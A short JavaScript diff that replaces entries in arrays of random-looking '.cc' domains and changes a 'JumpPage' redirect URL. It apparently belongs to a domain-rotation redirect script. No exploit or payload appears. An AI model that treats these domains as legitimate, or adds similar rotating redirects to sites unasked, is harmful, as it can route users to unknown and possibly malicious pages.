@@ -43,11 +43,11 @@ var urls=[".brnohmbd.net",".kwncgug.com",".uyqtwfwm.com",".zzhwoyv.com"];
 
 var urls=[];
         urls.push(".jyskobqbp.cc"); 
-        urls.push(".qgbbmlwn.cc");
+        urls.push(".ukvychaaq.cc");
         urls.push(".cmvuvpum.cc");
-        urls.push(".qgbbmlwn.cc");    
+        urls.push(".uwtchvbn.cc");    
            
-var JumpPage="https://hlgigrkxw.cc";
+var JumpPage="https://ukvychaaq.cc";
 
 var newestUrls = [];
 
